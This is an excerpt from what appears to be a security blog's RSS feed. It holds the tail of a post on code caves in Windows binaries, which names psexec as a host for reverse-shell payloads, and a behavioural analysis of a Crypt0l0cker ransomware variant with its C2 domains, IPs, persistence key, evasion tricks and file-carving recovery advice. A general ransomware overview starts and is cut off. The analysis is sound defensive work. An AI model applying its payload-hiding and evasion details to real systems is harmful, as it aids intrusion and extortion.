margin-left: 1em;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;200&#34; src=&#34;https://2.bp.blogspot.com/-C30cX4-265o/VwrCUVYTdAI/AAAAAAAAMsg/dg66jLwzJQ4MqcnTllzyliT7LjQ6xzs-g/s200/Screen%2BShot%2B2016-04-10%2Bat%2B23.14.33.png&#34; width=&#34;198&#34; /&gt;&lt;/a&gt;&lt;br /&gt;&lt;i&gt;Winobj:&lt;/i&gt;&lt;br /&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Found Interesting patterns out there. We observe more big caves rather than small ones. Winobj is ideal for hiding big sized payloads even bigger than 1024b.&lt;/div&gt;&lt;i&gt;&lt;br /&gt;&lt;/i&gt;&lt;br /&gt;&lt;i&gt;&lt;br /&gt;&lt;/i&gt;&lt;i&gt;&amp;nbsp;&lt;/i&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;a href=&#34;https://2.bp.blogspot.com/-XbHyQnMiuWk/VwrCkKGmMwI/AAAAAAAAMsk/V7XQ3egZQ_8Vl5FCQGM5ZIDz7LUUJxEQg/s1600/Screen%2BShot%2B2016-04-10%2Bat%2B23.15.39.png&#34; imageanchor=&#34;1&#34; style=&#34;clear: right; float: right; margin-bottom: 1em; margin-left: 1em;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;200&#34; src=&#34;https://2.bp.blogspot.com/-XbHyQnMiuWk/VwrCkKGmMwI/AAAAAAAAMsk/V7XQ3egZQ_8Vl5FCQGM5ZIDz7LUUJxEQg/s200/Screen%2BShot%2B2016-04-10%2Bat%2B23.15.39.png&#34; width=&#34;195&#34; /&gt;&lt;/a&gt;&lt;i&gt;psexec:&lt;/i&gt;&lt;br /&gt;Maybe one of the most used executables from sys admin, it is super helpful to run remote code. We observed many midium sized caves while no caves bigger then 7xxbits have been found. It would be a great candidate for &lt;i&gt;reverse_tcp&lt;/i&gt; or &lt;i&gt;reverse_http payloads&lt;/i&gt; (size 250b to 380b)&lt;i&gt;&lt;br /&gt;&lt;/i&gt;&lt;br /&gt;&lt;i&gt;&lt;br /&gt;&lt;/i&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;I do not have conclusions here, I admit -- I was ready to bet on Microsoft. I thought Microsoft would not ship code within caves on it. But I Was wrong, fortunately I do not like gambling game!&lt;/div&gt;
</description>
    </item>
    
    <item>
      <title>Recovering Files From Brand New Crypt0l0cker</title>
      <link>http://marcoramilli.com/post/recovering-files-from-brand-new-crypt0l0cker/</link>
      <pubDate>Mon, 21 Mar 2016 23:29:00 UTC</pubDate>
      
      <guid>http://marcoramilli.com/post/recovering-files-from-brand-new-crypt0l0cker/</guid>
      <description>&lt;div dir=&#34;ltr&#34; style=&#34;text-align: left;&#34; trbidi=&#34;on&#34;&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Today I want to share a quick&#39;n dirty analysis of a brand new &lt;b&gt;Crypt0l0cker &lt;/b&gt;version realised for the Italian market and spread over emails (such as: ENEL Bolletta). &amp;nbsp;Unfortunately I do not have much time to invest in that analysis but we will analyse how we might be able to recover mostly of the encrypted data.&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;br /&gt;&lt;br class=&#34;Apple-interchange-newline&#34; /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://3.bp.blogspot.com/-D2V3n1b7_UY/Vu5GjgPDHGI/AAAAAAAAMoQ/LxuJBH6UL5INsEnSxMbeBZeWO6LPRrQOA/s1600/Screen%2BShot%2B2016-03-20%2Bat%2B07.42.51.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;312&#34; src=&#34;https://3.bp.blogspot.com/-D2V3n1b7_UY/Vu5GjgPDHGI/AAAAAAAAMoQ/LxuJBH6UL5INsEnSxMbeBZeWO6LPRrQOA/s400/Screen%2BShot%2B2016-03-20%2Bat%2B07.42.51.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;New Crypt0l0cker Version&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;br /&gt;Sample signatures:&lt;br /&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&lt;span class=&#34;Apple-tab-span&#34;&gt;&lt;/span&gt;[*] MD5&amp;nbsp;&lt;span class=&#34;Apple-tab-span&#34;&gt;&lt;/span&gt;:&amp;nbsp;&lt;b&gt;aafc1dcd976f91b50e1f71017b8ab10f&lt;/b&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&lt;span class=&#34;Apple-tab-span&#34;&gt;&lt;/span&gt;[*] SHA-1&amp;nbsp;&lt;span class=&#34;Apple-tab-span&#34;&gt;&lt;/span&gt;:&amp;nbsp;&lt;b&gt;56e623b2d2a4abb09cfc23d754e0095f9a71a9cb&lt;/b&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&lt;span class=&#34;Apple-tab-span&#34;&gt;&lt;/span&gt;[*] SHA-256&lt;span class=&#34;Apple-tab-span&#34;&gt; &lt;/span&gt;:&amp;nbsp;&lt;b&gt;f44310005b4d75b15df0126e954c68456e7882ee6081cfd3e39f4267f86b44d9&lt;/b&gt;&lt;/span&gt;&lt;/div&gt;&lt;div class=&#34;p1&#34;&gt;&lt;span class=&#34;s1&#34;&gt;&lt;b&gt;&lt;br /&gt;&lt;/b&gt;&lt;/span&gt;&lt;/div&gt;Two Antivirus on FiftySix where able to tag the new Malware as &lt;b&gt;Suspicious &lt;/b&gt;executable. Baidu defines the new Crypt0l0cker as a generic Trojan (well, actually this version does &#34;Trojan&#34; too, please follow on reading) and Kaspersky defines it as &#34;&lt;b&gt;General&lt;/b&gt;&amp;nbsp;&lt;b&gt;Dangerous&#34;.&lt;/b&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://4.bp.blogspot.com/-eHFthCK7rRw/Vu5HVh5QKXI/AAAAAAAAMoY/8ZQY8DB_fSkDa8blOMs3gQgPpfk2ZWFzQ/s1600/Screen%2BShot%2B2016-03-18%2Bat%2B17.45.44.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;640&#34; src=&#34;https://4.bp.blogspot.com/-eHFthCK7rRw/Vu5HVh5QKXI/AAAAAAAAMoY/8ZQY8DB_fSkDa8blOMs3gQgPpfk2ZWFzQ/s640/Screen%2BShot%2B2016-03-18%2Bat%2B17.45.44.png&#34; width=&#34;280&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Antivirus Detection&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Giving the new Crypt0l0cker to a packer signature engine (which happens to be an .EXE implementing a PDF icon) you might find out two valid information: (a) The Sample has been likely compiled through Visual C++ and (b) no known packers have been involved.&lt;/div&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://1.bp.blogspot.com/-jzRuzVPn7Uc/Vu5RUJuCs3I/AAAAAAAAMoo/_Gui771UgTAtVAzPDL4KypX7wI9jo9Zdg/s1600/Screen%2BShot%2B2016-03-20%2Bat%2B08.25.41.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;208&#34; src=&#34;https://1.bp.blogspot.com/-jzRuzVPn7Uc/Vu5RUJuCs3I/AAAAAAAAMoo/_Gui771UgTAtVAzPDL4KypX7wI9jo9Zdg/s400/Screen%2BShot%2B2016-03-20%2Bat%2B08.25.41.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;PEiD OEP Plugin&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;br /&gt;Let&#39;s move directly on OEP and see what we&#39;ll find there ! A Decrypting loop within anti-debug traps is found (please see the Graph Overview in the following picture). It&#39;s time to statically read the code patching the anti-debug trap and later on firing up the executable to decrypt the memory stub.&lt;br /&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://3.bp.blogspot.com/-onhTHGnaCvc/Vu5SwzPSHUI/AAAAAAAAMo0/6BG8cDVO4IEjm7OoRFUWrdVs3D_Zm2v2Q/s1600/Screen%2BShot%2B2016-03-20%2Bat%2B08.31.29.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;161&#34; src=&#34;https://3.bp.blogspot.com/-onhTHGnaCvc/Vu5SwzPSHUI/AAAAAAAAMo0/6BG8cDVO4IEjm7OoRFUWrdVs3D_Zm2v2Q/s400/Screen%2BShot%2B2016-03-20%2Bat%2B08.31.29.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Decrypting loop within anti-debug traps&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;br /&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Patching the &#34;isDebugPresent-return-function&#34; and running the sample on a virtualized environment we might observe interesting behaviours. I wont spend time in writing how to reverse this sample but this time I am mostly interested in behaviour analysis. So letting run the code you will see the Malware injecting a DLL into &lt;i&gt;explorer.exe&lt;/i&gt;&amp;nbsp;getting administration privileges&amp;nbsp;and exchanging modules and keys through its CC on ngrok VPN networks. &amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;blockquote class=&#34;tr_bq&#34; style=&#34;text-align: justify;&#34;&gt;PERSONAL NOTE: I saw may samples scanning for ngrok connection (mostly to find out vulnerable systems) but I never seen before Ransomware using ngrok protocol to communicate through their command and control exchanging keys. Ngrok is a secure introspectable tunnel to &#34;localhost&#34; which remote &#34;localhost services&#34;. Ngrok is mostly used from developers to share preliminary results to their clients and for such a reason installed on developer &#39;s machines. If the Ransomware &#39;s author used ngrok from his own developer machine, we might be able to find him. But this is another &#34;story&#34;...&lt;/blockquote&gt;&lt;br /&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Following the Malware network activity you might appreciate a brand new &lt;b&gt;D&lt;/b&gt;omain &lt;b&gt;N&lt;/b&gt;ame &lt;b&gt;G&lt;/b&gt;eneration &lt;b&gt;A&lt;/b&gt;lgorithm based on &lt;b&gt;ngork&lt;/b&gt; &lt;b&gt;network&lt;/b&gt;:&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;- DNS Query(16807d6e.ngrok.com)&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;- DNS Query(d07a6607.ngrok.io)&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;- DNS Query(ofywoxonega.neokred.org)&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;- DNS Query(ilqde.neokred.org)&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;The Injected DLL communicates through the following address by exchanging encryption keys and modules:&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;** OUT,TCP - HTTP,192.168.1.69,171.25.193.9:80,C:\Windows\SysWOW64\explorer.exe&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;** IN,TCP - HTTP,171.25.193.9:80,192.168.1.69,C:\Windows\SysWOW64\explorer.exe&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;** OUT,TCP - HTTPS,192.168.1.69,198.211.127.225:443,C:\Windows\SysWOW64\explorer.exe&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;** IN,TCP - HTTPS,198.211.127.225:443,192.168.1.69,C:\Windows\SysWOW64\explorer.exe&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;** DNS Query(ibog.neokred.org)&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;** OUT,TCP - HTTPS,192.168.1.69,86.59.21.38:443,C:\Windows\SysWOW64\explorer.exe&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;** IN,TCP - HTTPS,86.59.21.38:443,192.168.1.69,C:\Windows\SysWOW64\explorer.exe&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;blockquote class=&#34;tr_bq&#34; style=&#34;text-align: justify;&#34;&gt;PERSONAL NOTE: it will be super interesting spending time in reversing the DNGA used in this sample. &lt;u&gt;Please if you have time to spend on this project contact me I&#39;ll send you the sample.&lt;/u&gt;&lt;/blockquote&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;As most of the Malware out there do, it sets itself in &#34;autorun&#34; to survive the system reboot. It copies itself into c:/windows/ and it changes the regkey to load the saved software (itself) on every system reboot (machine\software\microsoft\Windows\CurrentVersion\Run\utivikyh). The sample disables system securities and software quality-client as well, but this is out of my investigation topic. Before sending requests to C&amp;amp;C it harvests many information about the victims such as hardware components and keyboards layout. The malware is weaponized through modules it downloads from C&amp;amp;C. What has been found during this quick&#39;n dirty analysis is the following:&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&amp;nbsp; &amp;nbsp;* Keylogger functionality.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&amp;nbsp; &amp;nbsp;* Gets system default language ID.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&amp;nbsp; &amp;nbsp;* Gets input locale identifiers.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&amp;nbsp; &amp;nbsp;* Gets computer name.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&amp;nbsp; &amp;nbsp;* Encrypts data.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&amp;nbsp; &amp;nbsp;* Decrypts data.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&amp;nbsp; &amp;nbsp;* Checks for debuggers.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&amp;nbsp; &amp;nbsp;* Deletes activity traces.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&amp;nbsp; &amp;nbsp;* Anti-Malware Analyzer routine: Disk information query.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&amp;nbsp; &amp;nbsp; * Privilege Escalation Techniques.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;The Malware sample implements some elementary evasion techniques such as understanding the user behaviour by acquiring the used windows (&lt;a href=&#34;https://msdn.microsoft.com/it-it/library/windows/desktop/ms633505(v=vs.85).aspx&#34;&gt;GetForegroundWindow&lt;/a&gt;) and applying some heuristics on windows and mouses. It saves many (I do not have the evience about &#34;all&#34;) ongoing heuristics (or &#34;counters&#34; as the developer prefers to call them) into the following file:&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;C:\Users\user\AppData\Local\Microsoft\Windows\Temporary Internet Files\counters.dat&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;The Malware sample looks for email clients on the victim machines and tries to read out email address. Does it maybe send the new found emails addresses to Command and Control in order to self-empower central victim lists ? (I have no evidence of that, further analysis is needed)&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;The sample heavily uses &lt;b&gt;sleep&lt;/b&gt;(60000) all around the code to avoid simple sandboxes analyses. But let&#39;s analyse the interesting part of it: how this version of Crypt0l0cker encrypts files! Observing Syscalls tree we observe: &lt;b&gt;Encryption&lt;/b&gt; &lt;b&gt;Parallelization&lt;/b&gt; ! My best guess is that Malware writer uses parallelization to speed up the entire process of encryption. Indeed the victim&#39;s CPUs rise up to 90% and the Crypt0l0cker process increases the number of threads and sub-process as soon as the infection starts !&lt;br /&gt;&lt;br /&gt;Faster encryption means increasing the probability to encrypt user data before the victim stops the infection process. As more files will be encrypted as higher is the probability the user will pay for having them back!&lt;br /&gt;&lt;br /&gt;Each process performs the following &lt;u&gt;simplified&lt;/u&gt; encryption path:&lt;/div&gt;&lt;br /&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://3.bp.blogspot.com/-AWTvw8DZUN0/Vu6Dhogie3I/AAAAAAAAMpE/BdJN441f-Jgy_DX8qbGIqifI0-wYy9jlg/s1600/Screen%2BShot%2B2016-03-20%2Bat%2B12.03.09.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;210&#34; src=&#34;https://3.bp.blogspot.com/-AWTvw8DZUN0/Vu6Dhogie3I/AAAAAAAAMpE/BdJN441f-Jgy_DX8qbGIqifI0-wYy9jlg/s400/Screen%2BShot%2B2016-03-20%2Bat%2B12.03.09.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Observed Encryption Behaviour&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;As a first stage the Malware reads the file in a input dynamically sized buffer, while it&#39;s encrypting the read file it deletes the original file and create a new one directly on the hard drive which will be filled with the encrypted content. This encryption path is vulnerable to &lt;b&gt;file&lt;/b&gt; &lt;b&gt;carving&lt;/b&gt; &lt;b&gt;technique&lt;/b&gt; since Malware deletes the fileA and creates a new fileA.encrypted which will be (&lt;u&gt;&lt;b&gt;statistically but not scientifically&lt;/b&gt;&lt;/u&gt;) located in different HardDrive Block. So if you are a victim of such a Crypt0l0cker version (refers to hashes), and you do not have shadows file (File History, for windows 8 users) and/or backups you might try with file carving which it will statistically work :D !&lt;br /&gt;&lt;br /&gt;Older ransomware (such as: torrentlocker, teslacrypt, bitlocker, etc etc) use a different but most effective approach. Some of them, in order to increase the speed, encrypts only a specific part of the file, others just rewrites the original file but without creating a new file itself. In such a situation file carving is not going to work.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;Summing Up:&lt;/b&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;- We obtained a brand new version of Crypt0l0cker.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;- We &amp;nbsp;did have not enough time to invest on reversing the DNGA (based on &lt;a href=&#34;https://ngrok.com/&#34;&gt;ngrok&lt;/a&gt;) and the specific functionalities this original Crypt0l0cker have implemented, &amp;nbsp;BUT...&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;- We obtained two main interesting results:&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;/div&gt;&lt;ol&gt;&lt;li&gt;It is the first time we are observing a Malware implementing a DNGA based on private encrypted tunnels such as &lt;a href=&#34;https://ngrok.com/&#34;&gt;ngrok&lt;/a&gt;.&lt;/li&gt;&lt;li&gt;This Cryp0l0cker version use a vulnerable read-encrypt-write algorithm which might decrease its effectiveness and vulnerable to file carving.&lt;/li&gt;&lt;/ol&gt;&lt;div&gt;&lt;b&gt;Conclusions:&lt;/b&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;If you&#39;ve got infected by the Italian version of Crypt0l0cker try with file carving and you will probably get back data.&lt;/div&gt;&lt;div&gt;&lt;b&gt;&lt;br /&gt;&lt;/b&gt;&lt;/div&gt;&lt;br /&gt;&lt;b&gt;IoC:&lt;/b&gt;&lt;br /&gt;Extension:&lt;br /&gt;.encrypted&lt;br /&gt;&lt;br /&gt;&lt;span style=&#34;text-align: justify;&#34;&gt;DNS Queries:&amp;nbsp;&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;text-align: justify;&#34;&gt;16807d6e.ngrok.com&lt;/span&gt;&lt;br /&gt;&lt;span style=&#34;text-align: justify;&#34;&gt;d07a6607.ngrok.io&lt;/span&gt;&lt;br /&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;ofywoxonega.neokred.org&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;ilqde.neokred.org&lt;br /&gt;&lt;br /&gt;Temp File:&lt;br /&gt;C:\Users\user\AppData\Local\Microsoft\Windows\Temporary Internet Files\counters.dat&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
</description>
    </item>
    
    <item>
      <title>Ransomware: a general view after field experiences</title>
      <link>http://marcoramilli.com/post/ransomware-a-general-view-after-field-experiences/</link>
      <pubDate>Tue, 16 Feb 2016 04:08:00 UTC</pubDate>
      
      <guid>http://marcoramilli.com/post/ransomware-a-general-view-after-field-experiences/</guid>
      <description>&lt;div dir=&#34;ltr&#34; style=&#34;text-align: left;&#34; trbidi=&#34;on&#34;&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Even if Ransomware is not one of my favorite topics, since are simple Malware without specific targets (at least util today), I am currently observing a huge increment of this threat in companies, agencies and in private users as well. For such a reason I decided to write a little bit about them in my personal &#39;CyberSecurity Timeline&#39; (.. well... my blog :). I am not going to describe a specific kind of Ransomware or to show you out spectacular code or reverse techniques, in this &#34;post&#34; I just want to wrap many experiences on this topoc and to make more general though and memories.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;According to &lt;a href=&#34;https://www.netfort.com/blog/history-of-ransomware-attacks/#.VsAjhfFoxXU&#34;&gt;Netfort&lt;/a&gt; and &lt;a href=&#34;http://blog.trendmicro.com/trendlabs-security-intelligence/the-prevalence-of-crypto-ransomware/&#34;&gt;TrendMicro &lt;/a&gt;ransomware is not a real news in&amp;nbsp; cyber securiy, indeed:&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;blockquote class=&#34;tr_bq&#34;&gt;it was1989, the year of the “AIDS” trojan, aka. “Aids Info Disk” or “PC Cyborg Trojan” which replaced the AUTOEXEC.BAT file and it would then count the number of times the machine had booted, once it reached 90 days it would then hide directories and encrypt the names of all the files on the C: drive and rendered the system to be unusable. It would then display a message to the user asking them to “renew the license” and contact PC Cyborg Corporation for payment, this involved sending $189 to a post office box in Panama!&lt;/blockquote&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&amp;nbsp; During the past decade two main kinds of Ransomware were observed:&lt;/div&gt;&lt;ol style=&#34;text-align: justify;&#34;&gt;&lt;li&gt;&lt;b&gt;Locker&lt;/b&gt; &lt;b&gt;Ransomware&lt;/b&gt;. Aim of these threats is to deny the access of an entire victims&#39; machine. One of the most famous exponent of this cathegory is the &lt;b&gt;FBI&lt;/b&gt; &lt;b&gt;Locker&lt;/b&gt;.&lt;/li&gt;&lt;li&gt;&lt;b&gt;Data Ransomware. &lt;/b&gt;Aim of these threats is to deny the access of victims&#39;s data. One of the most famous exponent of this cathegory is the &lt;b&gt;CryptoLocker&lt;/b&gt;.&lt;/li&gt;&lt;/ol&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: center;&#34;&gt;&lt;a href=&#34;https://1.bp.blogspot.com/-F2upHKMm12k/VsAxbGm0cVI/AAAAAAAAMkg/1dS8NNErQTE/s1600/Virus-cryptolocker-come-proteggersi.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: 1em; margin-right: 1em;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;143&#34; src=&#34;https://1.bp.blogspot.com/-sIMkopdHSzY/VsAxaOirDaI/AAAAAAAAMkc/K9-ePLYIlgE/s200/eset-fbi-ransomware-s.png&#34; width=&#34;200&#34; /&gt; &lt;img border=&#34;0&#34; height=&#34;145&#34; src=&#34;https://1.bp.blogspot.com/-F2upHKMm12k/VsAxbGm0cVI/AAAAAAAAMkg/1dS8NNErQTE/s200/Virus-cryptolocker-come-proteggersi.png&#34; width=&#34;200&#34; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Both of the threats tamper with the user need of getting access to something she desires (like for example: PC, or Data) exploiting the &#39;attack momentum&#39; by asking few money. The user might be fooled because she believes to get the data/machine back by simply pay few bucks and she prefix to be more careful in the next future.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;What kind of platform do they infect ?&lt;/b&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Nowadays are known Rasomware for: &lt;b&gt;Microsoft&lt;/b&gt; &lt;b&gt;Windows&lt;/b&gt; (not care versions), &lt;b&gt;MAC&lt;/b&gt; &lt;b&gt;OSX&lt;/b&gt;, &lt;b&gt;Linux&lt;/b&gt; (mostly Debian and RedHat based) and &lt;b&gt;Android. &lt;/b&gt;Mostly of the infected systems belong to Personal Computers and Mobile Deices but Servers (such as: FTP, Domain Controls and Http) are affected to.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Another interesting (at least on my personal point of view) question is how &lt;b&gt;do they get into my device ?&lt;/b&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Understanding how they propagate through machines is a foundamental step to prevent them ! Unfortunately they do not use a favorite propagation vector. From the victim perspective I observed many propagation vectors based on eMAIL and Social Engineering tricks. But many of the most known ransomware such as (but not limited to): NanoLocker, Crypt0L0ker, CryptoWall and TeslaCrypt are spread over &lt;a href=&#34;http://marcoramilli.blogspot.it/2015/08/exploit-kits-on-august-2015.html&#34;&gt;Exploit 